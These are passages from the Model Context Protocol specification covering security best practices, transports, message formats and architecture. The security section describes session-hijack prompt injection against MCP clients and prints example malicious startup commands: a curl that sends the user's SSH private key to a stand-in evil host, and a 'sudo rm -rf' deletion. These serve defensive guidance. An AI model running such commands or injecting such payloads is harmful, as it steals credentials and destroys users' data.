ServerB\n    participant Attacker\n\n    Client->>ServerA: Initialize (connect to streamable HTTP server)\n    ServerA-->>Client: Respond with session ID\n\n    Attacker->>ServerB: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>ServerB: Trigger event (malicious payload, using session ID)\n    ServerB->>Queue: Enqueue event (keyed by session ID)\n\n    ServerA->>Queue: Poll for events (using session ID)\n    Queue-->>ServerA: Event data (malicious payload)\n\n    ServerA-->>Client: Async response (malicious payload)\n    Client->>Client: Acts based on malicious payload\n```\n\n#### Session Hijack Impersonation\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n    participant Attacker\n\n    Client->>Server: Initialize (login/authenticate)\n    Server-->>Client: Respond with session ID (persistent session created)\n\n    Attacker->>Server: Access/guess session ID\n    Note right of Attacker: Attacker knows/guesses session ID\n\n    Attacker->>Server: Make API call (using session ID, no re-auth)\n    Server-->>Attacker: Respond as if Attacker is Client (session hijack)\n```\n\n#### Attack Description\n\nWhen you have multiple stateful HTTP servers that handle MCP requests, the following attack vectors are possible:\n\n**Session Hijack Prompt Injection**\n\n1. The client connects to **Server A** and receives a session ID.\n1. The attacker obtains an existing session ID and sends a malicious event to **Server B** with said session ID.\n   - When a server supports [redelivery/resumable streams](/specification/2025-11-25/basic/transports#resumability-and-redelivery), deliberately terminating the request before receiving the response could lead to it being resumed by the original client via the GET request for server sent events.\n   - If a particular server initiates server sent events as a consequence of a tool call such as a `notifications/tools/list_changed`, where it is possible to affect the tools that are offered by the server, a client could end up with tools that they were not aware were enabled.\n\n1. **Server B** enqueues the event (associated with session ID) into a shared queue.\n1. **Server A** polls the queue for events using the session ID and retrieves the malicious payload.\n1. **Server A** sends the malicious payload to the client as an asynchronous or resumed response.\n1. The client receives and acts on the malicious payload, leading to potential compromise.\n\n**Session Hijack Impersonation**\n\n1. The MCP client authenticates with the MCP server, creating a persistent session ID.\n2. The attacker obtains the session ID.\n3. The attacker makes calls to the MCP server using the session ID.\n4. MCP server does not check for additional authorization and treats the attacker as a legitimate user, allowing unauthorized access or actions.\n\n#### Mitigation\n\nTo prevent session hijacking and event injection attacks, the following mitigations should be implemented:\n\nMCP servers that implement authorization **MUST** verify all inbound requests.\nMCP Servers **MUST NOT** use sessions for authentication.\n\nMCP servers **MUST** use secure, non-deterministic session IDs.\nGenerated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers that could be guessed by an attacker. Rotating or expiring session IDs can also reduce the risk.\n\nMCP servers **SHOULD** bind session IDs to user-specific information.\nWhen storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.\n\nMCP servers can optionally leverage additional unique identifiers.\n\n### Local MCP Server Compromise\n\nLocal MCP servers are MCP Servers running on a user's local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client's configuration flows. These servers may have direct access to the user's system and may be accessible to other processes running on the user's machine, making them attractive targets for attacks.\n\n#### Attack Description\n\nLocal MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:\n\n1. An attacker includes a malicious \"startup\" command in a client configuration\n2. An attacker distributes a malicious payload inside the server itself\n3. An attacker accesses an insecure local server that's left running on localhost via DNS rebinding\n\nExample malicious startup commands that could be embedded:\n\n```bash\n# Data exfiltration\nnpx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location\n\n# Privilege escalation\nsudo rm -rf /important/system/files && echo \"MCP server installed!\"\n```\n\n#### Risks\n\nLocal MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:\n\n- **Arbitrary code execution**. Attackers can execute any command with MCP client privileges.\n- **No visibility**. Users have no insight into what commands are being executed.\n- **Command obfuscation**. Malicious actors can use complex or convoluted commands to appear legitimate.\n- **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised javascript.\n- **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.\n\n#### Mitigation\n\nIf an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.\n\n**Pre-Configuration Consent**\n\nDisplay a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:\n\n- Show the exact command that will be executed, without truncation (include arguments and parameters)\n- Clearly identify it as a potentially dangerous operation that executes code on the user's system\n- Require explicit user approval before proceeding\n- Allow users to cancel the configuration\n\nThe MCP client **SHOULD** implement additional checks and guardrails to mitigate potential code execution attack vectors:\n\n- Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)\n- Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)\n- Warn that MCP servers run with the same privileges as the client\n- Execute MCP server commands in a sandboxed environment with minimal default privileges\n- Launch MCP servers with restricted access to the file system, network, and other system resources\n- Provide mechanisms for users to explicitly grant additional privileges (e.g., specific directory access, network access) when needed\n- Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes, etc.)\n\nMCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:\n\n- Use the `stdio` transport to limit access to just the MCP client\n- Restrict access if using an HTTP transport, such as:\n  - Require an authorization token\n  - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access\n\n### Scope Minimization\n\nPoor scope design increases token compromise impact, elevates user friction, and obscures audit trails.\n\n#### Attack Description\n\nAn attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables lateral data access, privilege chaining, and difficult revocation without re-consenting the entire surface.\n\n#### Risks\n\n- Expanded blast radius: stolen broad token enables unrelated tool/resource access\n- Higher friction on revocation: revoking a max-privilege token disrupts all workflows\n- Audit noise: single omnibus scope masks user intent per operation\n- Privilege chaining: attacker can immediately invoke high-risk tools without further elevation prompts\n- Consent abandonment: users decline dialogs listing excessive scopes\n- Scope inflation blindness: lack of metrics makes over-broad requests normalised\n\n#### Mitigation\n\nImplement a progressive, least-privilege scope model:\n\n- Minimal initial scope set (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations\n- Incremental elevation via targeted `WWW-Authenticate` `scope=\"...\"` challenges when privileged operations are first attempted\n- Down-scoping tolerance: server should accept reduced scope tokens; auth server MAY issue a subset of requested scopes\n\nServer guidance:\n\n- Emit precise scope challenges; avoid returning the full catalog\n- Log elevation events (scope requested, granted subset) with correlation IDs\n\nClient guidance:\n\n- Begin with only baseline scopes (or those specified by initial `WWW-Authenticate`)\n- Cache recent failures to avoid repeated elevation loops for denied scopes\n\n#### Common Mistakes\n\n- Publishing all possible scopes in `scopes_supported`\n- Using wildcard or omnibus scopes (`*`, `all`, `full-access`)\n- Bundling unrelated privileges to preempt future prompts\n- Returning entire scope catalog in every challenge\n- Silent scope semantic changes without versioning\n- Treating claimed scopes in token as sufficient without server-side authorization logic\n\nProper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.\n"}

Other components **MAY** be implemented based on the specific needs of the\napplication.\n\nThese protocol layers establish clear separation of concerns while enabling rich\ninteractions between clients and servers. The modular design allows implementations to\nsupport exactly the features they need.\n\n## Messages\n\nAll messages between MCP clients and servers **MUST** follow the\n[JSON-RPC 2.0](https://www.jsonrpc.org/specification) specification. The protocol defines\nthese types of messages:\n\n### Requests\n\n[Requests](/specification/2025-11-25/schema#jsonrpcrequest) are sent from the client to the server or vice versa, to initiate an operation.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Requests **MUST** include a string or integer ID.\n- Unlike base JSON-RPC, the ID **MUST NOT** be `null`.\n- The request ID **MUST NOT** have been previously used by the requestor within the same\n  session.\n\n### Responses\n\nResponses are sent in reply to requests, containing either the result or error of the operation.\n\n#### Result Responses\n\n[Result responses](/specification/2025-11-25/schema#jsonrpcresultresponse) are sent when the operation completes successfully.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  result: {\n    [key: string]: unknown;\n  }\n}\n```\n\n- Result responses **MUST** include the same ID as the request they correspond to.\n- Result responses **MUST** include a `result` field.\n- The `result` **MAY** follow any JSON object structure.\n\n#### Error Responses\n\n[Error responses](/specification/2025-11-25/schema#jsonrpcerrorresponse) are sent when the operation fails or encounters an error.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id?: string | number;\n  error: {\n    code: number;\n    message: string;\n    data?: unknown;\n  }\n}\n```\n\n- Error responses **MUST** include the same ID as the request they correspond to (except in error cases where the ID could not be read due a malformed request).\n- Error responses **MUST** include an `error` field with a `code` and `message`.\n- Error codes **MUST** be integers.\n\n### Notifications\n\n[Notifications](/specification/2025-11-25/schema#jsonrpcnotification) are sent from the client to the server or vice versa, as a one-way message.\nThe receiver **MUST NOT** send a response.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Notifications **MUST NOT** include an ID.\n\n## Auth\n\nMCP provides an [Authorization](/specification/2025-11-25/basic/authorization) framework for use with HTTP.\nImplementations using an HTTP-based transport **SHOULD** conform to this specification,\nwhereas implementations using STDIO transport **SHOULD NOT** follow this specification,\nand instead retrieve credentials from the environment.\n\nAdditionally, clients and servers **MAY** negotiate their own custom authentication and\nauthorization strategies.\n\nFor further discussions and contributions to the evolution of MCP's auth mechanisms, join\nus in\n[GitHub Discussions](https://github.com/modelcontextprotocol/specification/discussions)\nto help shape the future of the protocol!\n\n## Schema\n\nThe full specification of the protocol is defined as a\n[TypeScript schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-11-25/schema.ts).\nThis is the source of truth for all protocol messages and structures.\n\nThere is also a\n[JSON Schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-11-25/schema.json),\nwhich is automatically generated from the TypeScript source of truth, for use with\nvarious automated tooling.\n\n## JSON Schema Usage\n\nThe Model Context Protocol uses JSON Schema for validation throughout the protocol. This section clarifies how JSON Schema should be used within MCP messages.\n\n### Schema Dialect\n\nMCP supports JSON Schema with the following rules:\n\n1. **Default dialect**: When a schema does not include a `$schema` field, it defaults to JSON Schema 2020-12 (`https://json-schema.org/2025-11-25/2020-12/schema`)\n1. **Explicit dialect**: Schemas MAY include a `$schema` field to specify a different dialect\n1. **Supported dialects**: Implementations MUST support at least 2020-12 and SHOULD document which additional dialects they support\n1. **Recommendation**: Implementors are RECOMMENDED to use JSON Schema 2020-12.\n\n### Example Usage\n\n#### Default dialect (2020-12):\n\n```json\n{\n  \"type\": \"object\",\n  \"properties\": {\n    \"name\": { \"type\": \"string\" },\n    \"age\": { \"type\": \"integer\", \"minimum\": 0 }\n  },\n  \"required\": [\"name\"]\n}\n```\n\n#### Explicit dialect (draft-07):\n\n```json\n{\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"name\": { \"type\": \"string\" },\n    \"age\": { \"type\": \"integer\", \"minimum\": 0 }\n  },\n  \"required\": [\"name\"]\n}\n```\n\n### Implementation Requirements\n\n- Clients and servers **MUST** support JSON Schema 2020-12 for schemas without an explicit `$schema` field\n- Clients and servers **MUST** validate schemas according to their declared or default dialect. They **MUST** handle unsupported dialects gracefully by returning an appropriate error indicating the dialect is not supported.\n- Clients and servers **SHOULD** document which schema dialects they support\n\n### Schema Validation\n\n- Schemas **MUST** be valid according to their declared or default dialect\n\n## General fields\n\n### `_meta`\n\nThe `_meta` property/parameter is reserved by MCP to allow clients and servers\nto attach additional metadata to their interactions.\n\nCertain key names are reserved by MCP for protocol-level metadata, as specified below;\nimplementations MUST NOT make assumptions about values at these keys.\n\nAdditionally, definitions in the [schema](https://github.com/modelcontextprotocol/specification/blob/main/schema/2025-11-25/schema.ts)\nmay reserve particular names for purpose-specific metadata, as declared in those definitions.\n\n**Key name format:** valid `_meta` key names have two segments: an optional **prefix**, and a **name**.\n\n**Prefix:**\n\n- If specified, MUST be a series of labels separated by dots (`.`), followed by a slash (`/`).\n  - Labels MUST start with a letter and end with a letter or digit; interior characters can be letters, digits, or hyphens (`-`).\n  - Implementations SHOULD use reverse DNS notation (e.g., `com.example/` rather than `example.com/`).\n- Any prefix where the second label is `modelcontextprotocol` or `mcp` is **reserved** for MCP use.\n  - For example: `io.modelcontextprotocol/`, `dev.mcp/`, `org.modelcontextprotocol.api/`, and `com.mcp.tools/` are all reserved.\n  - However, `com.example.mcp/` is NOT reserved, as the second label is `example`.\n\n**Name:**\n\n- Unless empty, MUST begin and end with an alphanumeric character (`[a-z0-9A-Z]`).\n- MAY contain hyphens (`-`), underscores (`_`), dots (`.`), and alphanumerics in between.\n\n### `icons`\n\nThe `icons` property provides a standardized way for servers to expose visual identifiers for their resources, tools, prompts, and implementations. Icons enhance user interfaces by providing visual context and improving the discoverability of available functionality.\n\nIcons are represented as an array of `Icon` objects, where each icon includes:\n\n- `src`: A URI pointing to the icon resource (required). This can be:\n  - An HTTP/HTTPS URL pointing to an image file\n  - A data URI with base64-encoded image data\n- `mimeType`: Optional MIME type if the server's type is missing or generic\n- `sizes`: Optional array of size specifications (e.g., `[\"48x48\"]`, `[\"any\"]` for scalable formats like SVG, or `[\"48x48\", \"96x96\"]` for multiple sizes)\n\n**Required MIME type support:**\n\nClients that support rendering icons **MUST** support at least the following MIME types:\n\n- `image/png` - PNG images (safe, universal compatibility)\n- `image/jpeg` (and `image/jpg`) - JPEG images (safe, universal compatibility)\n\nClients that support rendering icons **SHOULD** also support:\n\n- `image/svg+xml` - SVG images (scalable but requires security precautions as noted below)\n- `image/webp` - WebP images (modern, efficient format)\n\n**Security considerations:**\n\nConsumers of icon metadata **MUST** take appropriate security precautions when handling icons to prevent compromise:\n\n- Treat icon metadata and icon bytes as untrusted inputs and defend against network, privacy, and parsing risks.\n- Ensure that the icon URI is either a HTTPS or `data:` URI. Clients **MUST** reject icon URIs that use unsafe schemes and redirects, such as `javascript:`, `file:`, `ftp:`, `ws:`, or local app URI schemes.\n  - Disallow scheme changes and redirects to hosts on different origins.\n- Be resilient against resource exhaustion attacks stemming from oversized images, large dimensions, or excessive frames (e.g., in GIFs).\n  - Consumers **MAY** set limits for image and content size.\n- Fetch icons without credentials. Do not send cookies, `Authorization` headers, or client credentials.\n- Verify that icon URIs are from the same origin as the server. This minimizes the risk of exposing data or tracking information to third-parties.\n- Exercise caution when fetching and rendering icons as the payload **MAY** contain executable content (e.g., SVG with [embedded JavaScript](https://www.w3.org/TR/SVG11/script.html) or [extended capabilities](https://www.w3.org/TR/SVG11/extend.html)).\n  - Consumers **MAY** choose to disallow specific file types or otherwise sanitize icon files before rendering.\n- Validate MIME types and file contents before rendering. Treat the MIME type information as advisory. Detect content type via magic bytes; reject on mismatch or unknown types.\n  - Maintain a strict allowlist of image types.\n\n**Usage:**\n\nIcons can be attached to:\n\n- `Implementation`: Visual identifier for the MCP server/client implementation\n- `Tool`: Visual representation of the tool's functionality\n- `Prompt`: Icon to display alongside prompt templates\n- `Resource`: Visual indicator for different resource types\n\nMultiple icons can be provided to support different display contexts and resolutions. Clients should select the most appropriate icon based on their UI requirements.\n"}

See the [backwards compatibility](#backwards-compatibility)\nguide below.\n\n</Info>\n\nIn the **Streamable HTTP** transport, the server operates as an independent process that\ncan handle multiple client connections. This transport uses HTTP POST and GET requests.\nServer can optionally make use of\n[Server-Sent Events](https://en.wikipedia.org/wiki/Server-sent_events) (SSE) to stream\nmultiple server messages. This permits basic MCP servers, as well as more feature-rich\nservers supporting streaming and server-to-client notifications and requests.\n\nThe server **MUST** provide a single HTTP endpoint path (hereafter referred to as the\n**MCP endpoint**) that supports both POST and GET methods. For example, this could be a\nURL like `https://example.com/mcp`.\n\n#### Security Warning\n\nWhen implementing Streamable HTTP transport:\n\n1. Servers **MUST** validate the `Origin` header on all incoming connections to prevent DNS rebinding attacks\n   - If the `Origin` header is present and invalid, servers **MUST** respond with HTTP 403 Forbidden. The HTTP response\n     body **MAY** comprise a JSON-RPC _error response_ that has no `id`\n2. When running locally, servers **SHOULD** bind only to localhost (127.0.0.1) rather than all network interfaces (0.0.0.0)\n3. Servers **SHOULD** implement proper authentication for all connections\n\nWithout these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites.\n\n### Sending Messages to the Server\n\nEvery JSON-RPC message sent from the client **MUST** be a new HTTP POST request to the\nMCP endpoint.\n\n1. The client **MUST** use HTTP POST to send JSON-RPC messages to the MCP endpoint.\n2. The client **MUST** include an `Accept` header, listing both `application/json` and\n   `text/event-stream` as supported content types.\n3. The body of the POST request **MUST** be a single JSON-RPC _request_, _notification_, or _response_.\n4. If the input is a JSON-RPC _response_ or _notification_:\n   - If the server accepts the input, the server **MUST** return HTTP status code 202\n     Accepted with no body.\n   - If the server cannot accept the input, it **MUST** return an HTTP error status code\n     (e.g., 400 Bad Request). The HTTP response body **MAY** comprise a JSON-RPC _error\n     response_ that has no `id`.\n5. If the input is a JSON-RPC _request_, the server **MUST** either\n   return `Content-Type: text/event-stream`, to initiate an SSE stream, or\n   `Content-Type: application/json`, to return one JSON object. The client **MUST**\n   support both these cases.\n6. If the server initiates an SSE stream:\n   - The server **SHOULD** immediately send an SSE event consisting of an event\n     ID and an empty `data` field in order to prime the client to reconnect\n     (using that event ID as `Last-Event-ID`).\n   - After the server has sent an SSE event with an event ID to the client, the\n     server **MAY** close the _connection_ (without terminating the _SSE stream_)\n     at any time in order to avoid holding a long-lived connection. The client\n     **SHOULD** then \"poll\" the SSE stream by attempting to reconnect.\n   - If the server does close the _connection_ prior to terminating the _SSE stream_,\n     it **SHOULD** send an SSE event with a standard [`retry`](https://html.spec.whatwg.org/multipage/server-sent-events.html#:~:text=field%20name%20is%20%22retry%22) field before\n     closing the connection. The client **MUST** respect the `retry` field,\n     waiting the given number of milliseconds before attempting to reconnect.\n   - The SSE stream **SHOULD** eventually include a JSON-RPC _response_ for the\n     JSON-RPC _request_ sent in the POST body.\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ before sending the\n     JSON-RPC _response_. These messages **SHOULD** relate to the originating client\n     _request_.\n   - The server **MAY** terminate the SSE stream if the [session](#session-management)\n     expires.\n   - After the JSON-RPC _response_ has been sent, the server **SHOULD** terminate the\n     SSE stream.\n   - Disconnection **MAY** occur at any time (e.g., due to network conditions).\n     Therefore:\n     - Disconnection **SHOULD NOT** be interpreted as the client cancelling its request.\n     - To cancel, the client **SHOULD** explicitly send an MCP `CancelledNotification`.\n     - To avoid message loss due to disconnection, the server **MAY** make the stream\n       [resumable](#resumability-and-redelivery).\n\n### Listening for Messages from the Server\n\n1. The client **MAY** issue an HTTP GET to the MCP endpoint. This can be used to open an\n   SSE stream, allowing the server to communicate to the client, without the client first\n   sending data via HTTP POST.\n2. The client **MUST** include an `Accept` header, listing `text/event-stream` as a\n   supported content type.\n3. The server **MUST** either return `Content-Type: text/event-stream` in response to\n   this HTTP GET, or else return HTTP 405 Method Not Allowed, indicating that the server\n   does not offer an SSE stream at this endpoint.\n4. If the server initiates an SSE stream:\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ on the stream.\n   - These messages **SHOULD** be unrelated to any concurrently-running JSON-RPC\n     _request_ from the client.\n   - The server **MUST NOT** send a JSON-RPC _response_ on the stream **unless**\n     [resuming](#resumability-and-redelivery) a stream associated with a previous client\n     request.\n   - The server **MAY** close the SSE stream at any time.\n   - If the server closes the _connection_ without terminating the _stream_, it\n     **SHOULD** follow the same polling behavior as described for POST requests:\n     sending a `retry` field and allowing the client to reconnect.\n   - The client **MAY** close the SSE stream at any time.\n\n### Multiple Connections\n\n1. The client **MAY** remain connected to multiple SSE streams simultaneously.\n2. The server **MUST** send each of its JSON-RPC messages on only one of the connected\n   streams; that is, it **MUST NOT** broadcast the same message across multiple streams.\n   - The risk of message loss **MAY** be mitigated by making the stream\n     [resumable](#resumability-and-redelivery).\n\n### Resumability and Redelivery\n\nTo support resuming broken connections, and redelivering messages that might otherwise be\nlost:\n\n1. Servers **MAY** attach an `id` field to their SSE events, as described in the\n   [SSE standard](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation).\n   - If present, the ID **MUST** be globally unique across all streams within that\n     [session](#session-management)—or all streams with that specific client, if session\n     management is not in use.\n   - Event IDs **SHOULD** encode sufficient information to identify the originating\n     stream, enabling the server to correlate a `Last-Event-ID` to the correct stream.\n2. If the client wishes to resume after a disconnection (whether due to network failure\n   or server-initiated closure), it **SHOULD** issue an HTTP GET to the MCP endpoint,\n   and include the\n   [`Last-Event-ID`](https://html.spec.whatwg.org/multipage/server-sent-events.html#the-last-event-id-header)\n   header to indicate the last event ID it received.\n   - The server **MAY** use this header to replay messages that would have been sent\n     after the last event ID, _on the stream that was disconnected_, and to resume the\n     stream from that point.\n   - The server **MUST NOT** replay messages that would have been delivered on a\n     different stream.\n   - This mechanism applies regardless of how the original stream was initiated (via\n     POST or GET). Resumption is always via HTTP GET with `Last-Event-ID`.\n\nIn other words, these event IDs should be assigned by servers on a _per-stream_ basis, to\nact as a cursor within that particular stream.\n\n### Session Management\n\nAn MCP \"session\" consists of logically related interactions between a client and a\nserver, beginning with the [initialization phase](/specification/2025-11-25/basic/lifecycle). To support\nservers which want to establish stateful sessions:\n\n1. A server using the Streamable HTTP transport **MAY** assign a session ID at\n   initialization time, by including it in an `MCP-Session-Id` header on the HTTP\n   response containing the `InitializeResult`.\n   - The session ID **SHOULD** be globally unique and cryptographically secure (e.g., a\n     securely generated UUID, a JWT, or a cryptographic hash).\n   - The session ID **MUST** only contain visible ASCII characters (ranging from 0x21 to\n     0x7E).\n   - The client **MUST** handle the session ID in a secure manner, see [Session Hijacking mitigations](/specification/2025-11-25/basic/security_best_practices#session-hijacking) for more details.\n2. If an `MCP-Session-Id` is returned by the server during initialization, clients using\n   the Streamable HTTP transport **MUST** include it in the `MCP-Session-Id` header on\n   all of their subsequent HTTP requests.\n   - Servers that require a session ID **SHOULD** respond to requests without an\n     `MCP-Session-Id` header (other than initialization) with HTTP 400 Bad Request.\n3. The server **MAY** terminate the session at any time, after which it **MUST** respond\n   to requests containing that session ID with HTTP 404 Not Found.\n4. When a client receives HTTP 404 in response to a request containing an\n   `MCP-Session-Id`, it **MUST** start a new session by sending a new `InitializeRequest`\n   without a session ID attached.\n5. Clients that no longer need a particular session (e.g., because the user is leaving\n   the client application) **SHOULD** send an HTTP DELETE to the MCP endpoint with the\n   `MCP-Session-Id` header, to explicitly terminate the session.\n   - The server **MAY** respond to this request with HTTP 405 Method Not Allowed,\n     indicating that the server does not allow clients to terminate sessions.\n\n### Sequence Diagram\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    note over Client, Server: initialization\n\n    Client->>+Server: POST InitializeRequest\n    Server->>-Client: InitializeResponse<br>MCP-Session-Id: 1868a90c...\n\n    Client->>+Server: POST InitializedNotification<br>MCP-Session-Id: 1868a90c...\n    Server->>-Client: 202 Accepted\n\n    note over Client, Server: client requests\n    Client->>+Server: POST ... request ...<br>MCP-Session-Id: 1868a90c...\n\n    alt single HTTP response\n      Server->>Client: ... response ...\n    else server opens SSE stream\n      loop while connection remains open\n          Server-)Client: ...

SSE messages from server ...\n    end\n    deactivate Server\n\n```\n\n### Protocol Version Header\n\nIf using HTTP, the client **MUST** include the `MCP-Protocol-Version:\n<protocol-version>` HTTP header on all subsequent requests to the MCP\nserver, allowing the MCP server to respond based on the MCP protocol version.\n\nFor example: `MCP-Protocol-Version: 2025-11-25`\n\nThe protocol version sent by the client **SHOULD** be the one [negotiated during\ninitialization](/specification/2025-11-25/basic/lifecycle#version-negotiation).\n\nFor backwards compatibility, if the server does _not_ receive an `MCP-Protocol-Version`\nheader, and has no other way to identify the version - for example, by relying on the\nprotocol version negotiated during initialization - the server **SHOULD** assume protocol\nversion `2025-03-26`.\n\nIf the server receives a request with an invalid or unsupported\n`MCP-Protocol-Version`, it **MUST** respond with `400 Bad Request`.\n\n### Backwards Compatibility\n\nClients and servers can maintain backwards compatibility with the deprecated [HTTP+SSE\ntransport](/specification/2024-11-05/basic/transports#http-with-sse) (from\nprotocol version 2024-11-05) as follows:\n\n**Servers** wanting to support older clients should:\n\n- Continue to host both the SSE and POST endpoints of the old transport, alongside the\n  new \"MCP endpoint\" defined for the Streamable HTTP transport.\n  - It is also possible to combine the old POST endpoint and the new MCP endpoint, but\n    this may introduce unneeded complexity.\n\n**Clients** wanting to support older servers should:\n\n1. Accept an MCP server URL from the user, which may point to either a server using the\n   old transport or the new transport.\n2. Attempt to POST an `InitializeRequest` to the server URL, with an `Accept` header as\n   defined above:\n   - If it succeeds, the client can assume this is a server supporting the new Streamable\n     HTTP transport.\n   - If it fails with the following HTTP status codes \"400 Bad Request\", \"404 Not\n     Found\" or \"405 Method Not Allowed\":\n     - Issue a GET request to the server URL, expecting that this will open an SSE stream\n       and return an `endpoint` event as the first event.\n     - When the `endpoint` event arrives, the client can assume this is a server running\n       the old HTTP+SSE transport, and should use that transport for all subsequent\n       communication.\n\n## Custom Transports\n\nClients and servers **MAY** implement additional custom transport mechanisms to suit\ntheir specific needs. The protocol is transport-agnostic and can be implemented over any\ncommunication channel that supports bidirectional message exchange.\n\nImplementers who choose to support custom transports **MUST** ensure they preserve the\nJSON-RPC message format and lifecycle requirements defined by MCP. Custom transports\n**SHOULD** document their specific connection establishment and message exchange patterns\nto aid interoperability.\n"}

Built on JSON-RPC, MCP provides a stateful session protocol focused\non context exchange and sampling coordination between clients and servers.\n\n## Core Components\n\n```mermaid\ngraph LR\n    subgraph \"Application Host Process\"\n        H[Host]\n        C1[Client 1]\n        C2[Client 2]\n        C3[Client 3]\n        H --> C1\n        H --> C2\n        H --> C3\n    end\n\n    subgraph \"Local machine\"\n        S1[Server 1<br>Files & Git]\n        S2[Server 2<br>Database]\n        R1[(\"Local<br>Resource A\")]\n        R2[(\"Local<br>Resource B\")]\n\n        C1 --> S1\n        C2 --> S2\n        S1 <--> R1\n        S2 <--> R2\n    end\n\n    subgraph \"Internet\"\n        S3[Server 3<br>External APIs]\n        R3[(\"Remote<br>Resource C\")]\n\n        C3 --> S3\n        S3 <--> R3\n    end\n```\n\n### Host\n\nThe host process acts as the container and coordinator:\n\n- Creates and manages multiple client instances\n- Controls client connection permissions and lifecycle\n- Enforces security policies and consent requirements\n- Handles user authorization decisions\n- Coordinates AI/LLM integration and sampling\n- Manages context aggregation across clients\n\n### Clients\n\nEach client is created by the host and maintains an isolated server connection:\n\n- Establishes one stateful session per server\n- Handles protocol negotiation and capability exchange\n- Routes protocol messages bidirectionally\n- Manages subscriptions and notifications\n- Maintains security boundaries between servers\n\nA host application creates and manages multiple clients, with each client having a 1:1\nrelationship with a particular server.\n\n### Servers\n\nServers provide specialized context and capabilities:\n\n- Expose resources, tools and prompts via MCP primitives\n- Operate independently with focused responsibilities\n- Request sampling through client interfaces\n- Must respect security constraints\n- Can be local processes or remote services\n\n## Design Principles\n\nMCP is built on several key design principles that inform its architecture and\nimplementation:\n\n1. **Servers should be extremely easy to build**\n   - Host applications handle complex orchestration responsibilities\n   - Servers focus on specific, well-defined capabilities\n   - Simple interfaces minimize implementation overhead\n   - Clear separation enables maintainable code\n\n2. **Servers should be highly composable**\n   - Each server provides focused functionality in isolation\n   - Multiple servers can be combined seamlessly\n   - Shared protocol enables interoperability\n   - Modular design supports extensibility\n\n3. **Servers should not be able to read the whole conversation, nor \"see into\" other\n   servers**\n   - Servers receive only necessary contextual information\n   - Full conversation history stays with the host\n   - Each server connection maintains isolation\n   - Cross-server interactions are controlled by the host\n   - Host process enforces security boundaries\n\n4. **Features can be added to servers and clients progressively**\n   - Core protocol provides minimal required functionality\n   - Additional capabilities can be negotiated as needed\n   - Servers and clients evolve independently\n   - Protocol designed for future extensibility\n   - Backwards compatibility is maintained\n\n## Capability Negotiation\n\nThe Model Context Protocol uses a capability-based negotiation system where clients and\nservers explicitly declare their supported features during initialization. Capabilities\ndetermine which protocol features and primitives are available during a session.\n\n- Servers declare capabilities like resource subscriptions, tool support, and prompt\n  templates\n- Clients declare capabilities like sampling support and notification handling\n- Both parties must respect declared capabilities throughout the session\n- Additional capabilities can be negotiated through extensions to the protocol\n\n```mermaid\nsequenceDiagram\n    participant Host\n    participant Client\n    participant Server\n\n    Host->>+Client: Initialize client\n    Client->>+Server: Initialize session with capabilities\n    Server-->>Client: Respond with supported capabilities\n\n    Note over Host,Server: Active Session with Negotiated Features\n\n    loop Client Requests\n        Host->>Client: User- or model-initiated action\n        Client->>Server: Request (tools/resources)\n        Server-->>Client: Response\n        Client-->>Host: Update UI or respond to model\n    end\n\n    loop Server Requests\n        Server->>Client: Request (sampling)\n        Client->>Host: Forward to AI\n        Host-->>Client: AI response\n        Client-->>Server: Response\n    end\n\n    loop Notifications\n        Server--)Client: Resource updates\n        Client--)Server: Status changes\n    end\n\n    Host->>Client: Terminate\n    Client->>-Server: End session\n    deactivate Server\n```\n\nEach capability unlocks specific protocol features for use during the session. For\nexample:\n\n- Implemented [server features](/specification/2025-11-25/server) must be advertised in the\n  server's capabilities\n- Emitting resource subscription notifications requires the server to declare\n  subscription support\n- Tool invocation requires the server to declare tool capabilities\n- [Sampling](/specification/2025-11-25/client) requires the client to declare support in its\n  capabilities\n\nThis capability negotiation ensures clients and servers have a clear understanding of\nsupported functionality while maintaining protocol extensibility.\n"}

